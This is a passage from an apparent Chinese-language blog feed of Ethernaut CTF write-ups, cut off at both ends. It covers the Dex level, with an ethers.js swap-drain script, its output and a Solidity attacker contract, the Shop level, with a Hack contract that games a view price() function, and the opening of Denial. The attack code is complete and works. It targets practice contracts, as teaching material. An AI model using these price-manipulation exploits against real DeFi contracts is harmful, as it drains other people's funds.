class="title function_">balanceOf</span>(token1Address,myAddress)</span><br><span class="line">        <span class="keyword">const</span> swap_token4_5 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token2Address,myAddress)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中我的token1余额为:<span class="subst">$&#123;swap_token3_5.toString()&#125;</span>`</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中我的token2余额为:<span class="subst">$&#123;swap_token4_5.toString()&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> tx_complete = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">swap</span>(token2Address,token1Address,<span class="number">45</span>,&#123; <span class="attr">gasLimit</span>: <span class="number">2100000</span>, <span class="attr">gasPrice</span>: <span class="number">50000000000</span> &#125;)</span><br><span class="line">    <span class="keyword">await</span> tx_complete.<span class="title function_">wait</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;========【攻击完成】=======&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检验结果</span></span><br><span class="line">    <span class="keyword">const</span> token1AfterAttack = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token1Address,<span class="title class_">DexAddress</span>)</span><br><span class="line">    <span class="keyword">const</span> token2AfterAttack = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token2Address,<span class="title class_">DexAddress</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中的token1余额为:<span class="subst">$&#123;token1AfterAttack.toString()&#125;</span>`</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中的token2余额为:<span class="subst">$&#123;token2AfterAttack.toString()&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> myToken1AfterAttack = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token1Address,myAddress)</span><br><span class="line">    <span class="keyword">const</span> myToken2AfterAttack = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token2Address,myAddress)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中我的token1余额为:<span class="subst">$&#123;myToken1AfterAttack.toString()&#125;</span>`</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中我的token2余额为:<span class="subst">$&#123;myToken2AfterAttack.toString()&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">y</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">token1的地址0x9Faf5813FB3d33780046F67554b29a5900dD4e0b</span><br><span class="line">token2的地址0x9510ec9eEd4fe4f42a49EB0529E2C9d222c66165</span><br><span class="line">攻击之前,Dex中的token1余额为:100</span><br><span class="line">攻击之前,Dex中的token2余额为:100</span><br><span class="line">攻击之前,Dex中我的token1余额为:10</span><br><span class="line">攻击之前,Dex中我的token2余额为:10</span><br><span class="line">给Dex授权token1完成</span><br><span class="line">给Dex授权token2完成</span><br><span class="line">开始进行swap</span><br><span class="line">========【第1次swap完成】=======</span><br><span class="line">攻击之后,Dex中的token1余额为:110</span><br><span class="line">攻击之后,Dex中的token2余额为:90</span><br><span class="line">攻击之后,Dex中我的token1余额为:0</span><br><span class="line">攻击之后,Dex中我的token2余额为:20</span><br><span class="line">========【第2次swap完成】=======</span><br><span class="line">攻击之后,Dex中的token1余额为:86</span><br><span class="line">攻击之后,Dex中的token2余额为:110</span><br><span class="line">攻击之后,Dex中我的token1余额为:24</span><br><span class="line">攻击之后,Dex中我的token2余额为:0</span><br><span class="line">========【第3次swap完成】=======</span><br><span class="line">攻击之后,Dex中的token1余额为:110</span><br><span class="line">攻击之后,Dex中的token2余额为:80</span><br><span class="line">攻击之后,Dex中我的token1余额为:0</span><br><span class="line">攻击之后,Dex中我的token2余额为:30</span><br><span class="line">========【第4次swap完成】=======</span><br><span class="line">攻击之后,Dex中的token1余额为:69</span><br><span class="line">攻击之后,Dex中的token2余额为:110</span><br><span class="line">攻击之后,Dex中我的token1余额为:41</span><br><span class="line">攻击之后,Dex中我的token2余额为:0</span><br><span class="line">========【第5次swap完成】=======</span><br><span class="line">攻击之后,Dex中的token1余额为:110</span><br><span class="line">攻击之后,Dex中的token2余额为:45</span><br><span class="line">攻击之后,Dex中我的token1余额为:0</span><br><span class="line">攻击之后,Dex中我的token2余额为:65</span><br><span class="line">========【攻击完成】=======</span><br><span class="line">攻击之后,Dex中的token1余额为:90</span><br><span class="line">攻击之后,Dex中的token2余额为:0</span><br><span class="line">攻击之后,Dex中我的token1余额为:110</span><br><span class="line">攻击之后,Dex中我的token2余额为:20</span><br></pre></td></tr></table></figure><p>成功</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/22.Dex/image-20230326100923756.png" alt="image-20230326100923756"></p><p><img src="/2023/06/23/04.Ethernaut%20CTF/22.Dex/image-20230326101025361.png" alt="image-20230326101025361"></p><h3 id="remix调用合约攻击"><a href="#remix调用合约攻击" class="headerlink" title="remix调用合约攻击"></a>remix调用合约攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &#x27;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Dex is Ownable &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function addLiquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount = getSwapPrice(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint amount) public &#123;</span><br><span class="line">    SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">    return IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">    require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">    super._approve(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attacker&#123;</span><br><span class="line">    Dex public immutable dex;</span><br><span class="line">    IERC20 public immutable token1;</span><br><span class="line">    IERC20 public immutable token2;</span><br><span class="line"></span><br><span class="line">    constructor(Dex _dex)&#123;</span><br><span class="line">        dex = _dex;</span><br><span class="line">        token1 = IERC20(dex.token1());</span><br><span class="line">        token2 = IERC20(dex.token2());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public&#123;</span><br><span class="line"></span><br><span class="line">        token1.transferFrom(msg.sender, address(this), 10);</span><br><span class="line">        token2.transferFrom(msg.sender, address(this), 10);</span><br><span class="line"></span><br><span class="line">        token1.approve(address(dex), type(uint256).max);</span><br><span class="line">        token2.approve(address(dex), type(uint256).max);</span><br><span class="line">    </span><br><span class="line">        _swap(token1, token2);</span><br><span class="line">        _swap(token2, token1);</span><br><span class="line">        _swap(token1, token2);</span><br><span class="line">        _swap(token2, token1);</span><br><span class="line">        _swap(token1, token2);</span><br><span class="line">    </span><br><span class="line">        dex.swap(address(token2), address(token1), 45);</span><br><span class="line">        require(token1.balanceOf(address(dex)) == 0,&quot;dex balance != 0&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _swap(IERC20 tokenIn, IERC20 tokenOut) public&#123;</span><br><span class="line">        dex.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="另外"><a href="#另外" class="headerlink" title="另外"></a>另外</h2><p>此题如果添加流动性没有onlyOwner修饰，那么我们还可以通过另外一种方式攻击：自己创建一种代币，给自己mint 1百万个，添加流动性，然后直接换走100的token1。</p><p>当然下面的代码并不完善！只是整体思路如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;ethers&#125; = <span class="built_in">require</span>(<span class="string">&quot;ethers&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> provider = ethers.<span class="title function_">getDefaultProvider</span>(<span class="string">&quot;https://eth-goerli.g.alchemy.com/v2/??????????vvjKtn6UAi&quot;</span>);</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">y</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> address = <span class="string">&#x27;0x17aC72d1a7834170CfbC3D268bE4aeBa0ebBd827&#x27;</span></span><br><span class="line">    <span class="keyword">var</span> abi = <span class="string">&#x27;[&#123;&quot;inputs&quot;:[],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;constructor&quot;&#125;,&#123;&quot;anonymous&quot;:false,&quot;inputs&quot;:[&#123;&quot;indexed&quot;:true,&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;previousOwner&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;indexed&quot;:true,&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;newOwner&quot;,&quot;type&quot;:&quot;address&quot;&#125;],&quot;name&quot;:&quot;OwnershipTransferred&quot;,&quot;type&quot;:&quot;event&quot;,&quot;signature....&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//连接用户</span></span><br><span class="line">    <span class="comment">//利用私钥和provider创建wallet对象</span></span><br><span class="line">    <span class="keyword">const</span> privateKey = <span class="string">&#x27;????????????????&#x27;</span></span><br><span class="line">    <span class="keyword">const</span> wallet = <span class="keyword">new</span> ethers.<span class="title class_">Wallet</span>(privateKey, provider)</span><br><span class="line">    <span class="comment">// 声明可写合约</span></span><br><span class="line">    <span class="keyword">const</span> contract = <span class="keyword">new</span> ethers.<span class="title class_">Contract</span>(address, abi, wallet)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//查看初始状态</span></span><br><span class="line">    <span class="keyword">const</span> token1 = <span class="keyword">await</span> contract.<span class="title function_">token1</span>()</span><br><span class="line">    <span class="keyword">const</span> token2 = <span class="keyword">await</span> contract.<span class="title function_">token2</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`token1的地址<span class="subst">$&#123;token1&#125;</span>`</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`token2的地址<span class="subst">$&#123;token2&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> balance1 = <span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(token1,address)</span><br><span class="line">    <span class="keyword">const</span> balance2 = <span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(token2,address)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`初始状态,Dex中的token1余额为:<span class="subst">$&#123;balance1.toString()&#125;</span>`</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`初始状态,Dex中的token2余额为:<span class="subst">$&#123;balance2.toString()&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//部署合约</span></span><br><span class="line">    <span class="keyword">const</span> abiAttack = <span class="string">&#x27;[&#123;&quot;inputs&quot;:[],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;constructor&quot;&#125;,&#123;&quot;anonymous&quot;:false,&quot;inputs&quot;:[&#123;&quot;indexed&quot;:true,&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;owner&quot;,&quot;type&quot;:&quot;address&quot;&#125;,....&#x27;</span></span><br><span class="line">    <span class="keyword">const</span> bytecode = <span class="string">&#x27;60806040523480156200001157600080fd5b506040518060400160405280600881526020017f446578546f6b656e0000000000000000000000000000000000000000000000008152506040518060400160405280600981526020017f446578536f6c766572000000000000000000000000000000000000000000000081525081600390816200008f9190620004ef565b508060049081620000a19190620004ef565b505050620000e433620000b9620000e.......&#x27;</span></span><br><span class="line">    <span class="keyword">const</span> deployTokenFactory = <span class="keyword">new</span> ethers.<span class="title class_">ContractFactory</span>(abiAttack, bytecode, wallet);</span><br><span class="line">    <span class="comment">// 利用deployTokenFactory部署ERC20代币合约</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;利用deployTokenFactory部署ERC20代币合约&quot;</span>)</span><br><span class="line">    <span class="keyword">const</span> deployTokenContract = <span class="keyword">await</span> deployTokenFactory.<span class="title function_">deploy</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`合约地址: <span class="subst">$&#123;deployTokenContract.address&#125;</span>`</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;等待合约部署上链&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> deployTokenContract.<span class="title function_">deployed</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;合约已上链&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用攻击方法</span></span><br><span class="line">    <span class="comment">//1.approve给Dex合约</span></span><br><span class="line">    <span class="keyword">await</span> deployTokenContract.<span class="title function_">approve</span>(address,<span class="string">&#x27;100000000&#x27;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;完成approve&quot;</span>)</span><br><span class="line">    <span class="comment">//2.增加流动性100</span></span><br><span class="line">    <span class="keyword">await</span> contract.<span class="title function_">addLiquidity</span>(deployTokenContract.<span class="property">address</span>,<span class="number">100</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;完成添加流动性&quot;</span>)</span><br><span class="line">    <span class="comment">//3.查看用我创造的token，用100可以换多少token1</span></span><br><span class="line">    <span class="keyword">const</span> tokenToGet = <span class="keyword">await</span> contract.<span class="title function_">getSwapPrice</span>(deployTokenContract.<span class="property">address</span>,token1,<span class="number">100</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`查看用我创造的token,用100可以换多少token1:<span class="subst">$&#123;tokenToGet.toString()&#125;</span>`</span>)</span><br><span class="line">    <span class="comment">//4.交换</span></span><br><span class="line">    <span class="keyword">await</span> contract.<span class="title function_">swap</span>(deployTokenContract.<span class="property">address</span>,token1,<span class="number">100</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;完成swap&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检验结果</span></span><br><span class="line">    <span class="keyword">const</span> balanceAfterAttack = <span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(token1,address)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中的token1余额为:<span class="subst">$&#123;balanceAfterAttack.toString()&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">y</span>()</span><br></pre></td></tr></table></figure><p>当然这个靶场换题目了，这个方法在这不适用</p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>21.Shop</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/21.Shop/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/21.Shop/</url>
      
        <content type="html"><![CDATA[<h1 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h1><p>跟第11关很像</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>要求：修改price的值小于100（那我们就修改成0吧）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">  function price() external view returns (uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">  uint public price = 100;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  function buy() public &#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = true;</span><br><span class="line">      price = _buyer.price();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们发现这个题目要求我们修改price的值，并且buy()函数调用了两次接口的price()，price()需要我们去实现。</p><p>那么我们就需要第一次返回一个值，第二次返回另外一个不一样的值，以此来达到目的：第一次<code>_buyer.price() &gt;= price</code>返回的值应该大于等于100，第二次<code>price = _buyer.price();</code>返回的值应该为0。因此我们实现的price()，第一次和第二次调用的结果应该是不一样的</p><p>但是接口<code>function price() external view returns (uint);</code>的view告诉我们，不可以修改状态变量，因此我们写的内容不可以进行修改状态变量，可以变动的只有<code>isSold = true;</code>。那么，我们可以根据这个特点来进行写一个函数，isSold=false的时候返回100，isSold=true的时候返回0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function price() external view returns (uint256) &#123;</span><br><span class="line">return shop.isSold() ? 0 : 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="攻击代码"><a href="#攻击代码" class="headerlink" title="攻击代码"></a>攻击代码</h2><p>使用abstract contract而不是接口，因为写接口然后调用会显示潜在修改状态 state (<code>function price() external returns(uint256);</code>)，无法通过编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">abstract contract IShop &#123;</span><br><span class="line">    uint public price;</span><br><span class="line">    bool public isSold;</span><br><span class="line">    function buy() external virtual;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">    IShop public shop = IShop(0x06A0D2632aF25528392BDDe6c786fb21C3757cF1);</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        shop.buy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function price() external view returns (uint256) &#123;</span><br><span class="line">        return shop.isSold() ? 0 : 100;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>获取实例，攻击</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/21.Shop/image-20230125220407636.png" alt="image-20230125220407636"></p><p>成功</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/21.Shop/image-20230125220432915.png" alt="image-20230125220432915"></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>20.Denial</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/20.Denial/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/20.Denial/</url>
      
        <content type="html"><![CDATA[<h1 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>目标：这是一个简单的钱包，会随着时间的推移而流失资金。您可以成为提款伙伴，慢慢提款。通关条件： 在owner调用withdraw()时拒绝提取资金（合约仍有资金，并且交易的gas少于1M）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">contract Denial &#123;</span><br><span class="line"></span><br><span class="line">    address public partner; // withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address public constant owner = address(0xA9E);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances</span><br><span class="line"></span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint amountToSend = address(this).balance / 100;</span><br><span class="line">        // perform a call without checking return</span><br><span class="line">        // The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call&#123;value:amountToSend&#125;(&quot;&quot;);</span><br><span class="line">        payable(owner).transfer(amountToSend);</span><br><span class="line">        // keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn = block.timestamp;</span><br><span class="line">        withdrawPartnerBalances[partner] +=  amountToSend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow deposit of funds</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // convenience function</span><br><span class="line">    function contractBalance() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" 